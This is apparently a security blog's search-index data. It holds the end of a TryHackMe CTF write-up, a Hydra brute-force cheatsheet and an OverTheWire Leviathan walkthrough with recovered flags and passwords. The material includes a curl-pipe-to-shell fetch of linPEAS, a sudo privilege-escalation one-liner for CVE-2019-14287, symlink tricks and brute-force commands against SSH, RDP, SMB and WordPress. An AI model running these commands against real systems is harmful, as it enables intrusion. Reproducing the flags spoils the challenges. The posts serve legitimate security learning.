0:00:00:00 DONE (2021-11-20 19:07) 3.703g/s 113777p/s 113777c/s 113777C/s michael!..*star*Use the &quot;--show&quot; option to display all of the cracked passwords reliablySession completed. Password is aliensteg password: You will see a letter inside the zip file We need to send the picture to ‘QXJlYTUx’ as soon as possible! It is a base64 string. Area51 What is the other agent’s name? We haven’t looked at the jpeg yet. Use the password Area51┌──(root💀kali)-[/home/kali/Desktop/thm/agent-sudo]└─# steghide info cute-alien.jpg 1 ⨯&quot;cute-alien.jpg&quot;: format: jpeg capacity: 1.8 KBTry to get information about embedded data ? (y/n) yEnter passphrase: embedded file &quot;message.txt&quot;: size: 181.0 Byte encrypted: rijndael-128, cbc compressed: yes$ steghide extract -sf cute-alien.jpg Read the extracted message.txt james What is the SSH password? james:hackerrules!Task 4: Capture the user flagWhat is the user flag? ssh to james’s account. You will find the flag in the home directory. b03d975e8c92a7c04146cfa7a5a313c7 What is the incident of the photo called? Grab the picture for further inspection. Nothing abnormal here. Hmm…┌──(root💀kali)-[/home/kali/Desktop/thm/agent-sudo]└─# scp james@10.10.239.92:/home/james/Alien_autospy.jpg .james@10.10.239.92\\&#39;s password: Alien_autospy.jpg 100% 41KB 75.7KB/s 00:00 ┌──(root💀kali)-[/home/kali/Desktop/thm/agent-sudo]└─# exif Alien_autospy.jpg EXIF tags in &#39;Alien_autospy.jpg&#39; (&#39;Intel&#39; byte order):--------------------+----------------------------------------------------------Tag |Value--------------------+----------------------------------------------------------X-Resolution |72Y-Resolution |72Resolution Unit |InchExif Version |Exif Version 2.1FlashPixVersion |FlashPix Version 1.0Color Space |Uncalibrated--------------------+---------------------------------------------------------- Search the image on Google image and you find it ;) Somehow I find it disturbing. Roswell Alien Autopsy Task 5: Privilege EscalationWhat is the CVE? I downloaded linPEAS then run it remotely from the victim’s machine Excerpt from linPEAS’s instruction: #Local networksudo python -m SimpleHTTPServer 80 #Hostcurl 10.10.10.10/linpeas.sh | sh #Victim I gotta admit I work from the bottom up, weird… After running linPEAS, it points me to a sudo privelge escalation https://book.hacktricks.xyz/linux-unix/privilege-escalation#sudo-version After I used it I got root access sudo -u#-1 /bin/bash The CVE is CVE-2019-14287 if you’re wondering.Root flag In /root, b53a02f55b57d4439e3341834d70c062(Bonus) Who is agent R? In the root message, it said DesKel is agent R ;)" }, { "title": "[Knowledge] Hydra Cheatsheet", "url": "/posts/Hydra-Cheatsheet/", "categories": "Tool, Knowledge, Cheatsheet", "tags": "tool, knowledge, cheatsheet, hydra", "date": "2021-11-20 16:38:00 -0700", "snippet": " Command Description hydra -P password-file.txt -v $ip snmp Hydra brute force against SNMP hydra -t 1 -30 admin -P /usr/share/wordlists/rockyou.txt -vV $ip ftp Hydra FTP known user and rockyou password list hydra -v -V -u -L users.txt -P passwords.txt -t 1 -u $ip ssh Hydra SSH using list of users and passwords hydra -v -V -u -L users.txt -p &quot;&amp;lt;known password&amp;gt;&quot; -t 1 -u $ip ssh Hydra SSH using a known password and a username list hydra $ip -s 22 ssh -l &amp;lt;user&amp;gt; -P big_wordlist.txt Hydra SSH Against Known username on port 22 hydra -l USERNAME -P /usr/share/wordlistsnmap.lst -f $ip pop3 -V Hydra POP3 Brute Force hydra -P /usr/share/wordlistsnmap.lst $ip smtp -V Hydra SMTP Brute Force hydra -L ./webapp.txt -P ./webapp.txt $ip http-get /admin Hydra attack http get 401 login with a dictionary hydra -t 1 -V -f -l administrator -P /usr/share/wordlists/rockyou.txt rdp://$ip Hydra attack Windows Remote Desktop with rockyou hydra -t 1 -V -f -l administrator -P /usr/share/wordlists/rockyou.txt $ip smb Hydra brute force SMB user with rockyou: hydra -l admin -P ./passwordlist.txt $ip -V http-form-post &#39;/wp-login.php:log=^USER^&amp;amp;pwd=^PASS^&amp;amp;wp-submit=Log In&amp;amp;testcookie=1:S=Location&#39; Hydra brute force a Wordpress admin login hydra -L usernames.txt -P passwords.txt $ip smb -V -f SMB Brute Forcing hydra -L users.txt -P passwords.txt $ip ldap2 -V -f LDAP Brute Forcing " }, { "title": "[OverTheWire] [Leviathan] Report", "url": "/posts/OverTheWire-Leviathan/", "categories": "CTF, Write Up", "tags": "ctf, write-up, overthewire, leviathan", "date": "2021-11-20 14:20:00 -0700", "snippet": "Link: https://overthewire.org/wargames/leviathan/Level 0-&amp;gt;1$ ssh leviathan0@leviathan.labs.overthewire.org -p 2223 ls shows nothing. I tried to enumerate /etc/leviathan_pass but no access to leviathan1 file. ls -la the home directory. .backup is suspicious. Go into this folder there is a bookmark.html file.$ cat bookmark.html | grep leviathan1&amp;lt;DT&amp;gt;&amp;lt;A HREF=&quot;http://leviathan.labs.overthewire.org/passwordus.html | This will be fixed later, the password for leviathan1 is rioGegei8m&quot; ADD_DATE=&quot;1155384634&quot; LAST_CHARSET=&quot;ISO-8859-1&quot; ID=&quot;rdf:#$2wIU71&quot;&amp;gt;password to leviathan1&amp;lt;/A&amp;gt; The password is rioGegei8mLevel 1-&amp;gt;2 We see an executable called check in the home directory. You need to enter a password. Things I tried at first but no result.$ file check$ strings check But we know this is a C file. I went down the rabbit hole while trying to use gdb and Ghidra to decompile the file. (Maybe I’m bad lol) We know that the program is comparing the user input with a hardcoded string via strcmp() function. Lastly I used$ ltrace ./check We got our password is sex Once you get past this you will become leviathan2 The password is ougahZi8TaLevel 2-&amp;gt;3 This one is a bit trickier. When decompiling printfile it will shows that the program try to run access() with leviathan2 privilege but try to cat the file with leviathan3 privilege. After googling, we can create a symlink as a PoC. I tried to create a symlink to /etc/leviathan_pass/leviathan3 in /tmp Doesn’t seem to work too well. Another look at the decompiled code, the program seems to read all of our input WHILE cat can only the FIRST parameter. So if our input is “A B.txt”, it will only cat AiVar2 = access((char *)param_2[1],4);if (iVar2 == 0) { snprintf(local_210,0x1ff,&quot;/bin/cat %s&quot;,(char *)param_2[1]); __euid = geteuid(); __ruid = geteuid(); setreuid(__ruid,__euid); system(local_210); uVar1 = 0;}... Knowing that I did the following:$ cd /tmp/tlnguyen$ ln -s /etc/leviathan_pass/leviathan3 leviathan3$ touch &quot;leviathan3 file.txt&quot;$ ~/printfile &quot;leviathan3 file.txt&quot;Ahdiemoo1j/bin/cat: file.txt: No such file or directory The password is Ahdiemoo1jLevel 3-&amp;gt;4 This one is actually easy. If you ltrace ./level3 you will see 2 strcmp() with one being a decoy.leviathan3@leviathan:~$ ltrace ./level3__libc_start_main(0x8048618, 1, 0xffffd784, 0x80486d0 &amp;lt;unfinished ...&amp;gt;strcmp(&quot;h0no33&quot;, &quot;kakaka&quot;) = -1printf(&quot;Enter the password&amp;gt; &quot;) = 20fgets(Enter the password&amp;gt; WHAT&quot;WHAT\\n&quot;, 256, 0xf7fc55a0) = 0xffffd590strcmp(&quot;WHAT\\n&quot;, &quot;snlprintf\\n&quot;) = -1puts(&quot;bzzzzzzzzap. WRONG&quot;bzzzzzzzzap. WRONG) The real password is snlprintf Once done you will get a shell and can see leviathan4’s password leviathan4:vuH0coox6mLevel 4-&amp;gt;5 This one only gets … easier ??? Discover .trash/.bin cat this one seems to be binary file Easy, convert it to asciileviathan4@leviathan:~/.trash$ ./bin01010100 01101001 01110100 01101000 00110100 01100011 01101111 01101011 01100101 01101001 00001010 leviathan4@leviathan:~/.trash$ ./bin | perl -lape &#39;$_=pack&quot;(B8)*&quot;,@F&#39;Tith4cokei leviathan5:Tith4cokeiLevel 5-&amp;gt;6 Still, this one is easier than Level 2-&amp;gt;3 LOL. Using ltrace you will find out that the executable will try to fopen() a file at /tmp/file.log Create a file there, run leviathan5, it will read the file’s content and delete that file! Needless to say, this will be excuted with leviathan6’s privilege. I tried to create a bash executable that will print out leviathan6’s password but no luck. Correct guess, create a symlink to /etc/leviathan_pass/leviathan6!leviathan5@leviathan:~$ ln -s /etc/leviathan_pass/leviathan6 /tmp/file.logleviathan5@leviathan:~$ ./leviathan5UgaoFee4li leviathan6:UgaoFee4liLevel 6-&amp;gt;7 leviathan6 takes in your 4 digit code. Pass this bad boy to Ghidra, in the decompile code, you will see this excerpt:{ int iVar1; __uid_t __euid; __uid_t __ruid; if (param_1 != 2) { printf(&quot;usage: %s &amp;lt;4 digit code&amp;gt;\\n&quot;,*param_2); /* WARNING: Subroutine does not return */ exit(-1); } iVar1 = atoi((char *)param_2[1]); if (iVar1 == 0x1bd3) { __euid = geteuid(); __ruid = geteuid(); setreuid(__ruid,__euid); system(&quot;/bin/sh&quot;); } else { puts(&quot;Wrong&quot;); } return 0;} 0x1bd3 convert to Decimal is 7123 Now run ./leviathan6 7123 you will get a shell! leviathan7:ahy7MaeBo9Level 7-&amp;gt;8 Oh this is done lol! You will find a CONGRATULATIONS file." }, { "title": "Welcome To My Blog", "url": "/posts/Test-Post/", "categories": "CTF, Generic", "tags": "welcome", "date": "2021-11-19 10:51:00 -0700", "snippet": "Who is Derpy?A good boy." } ]
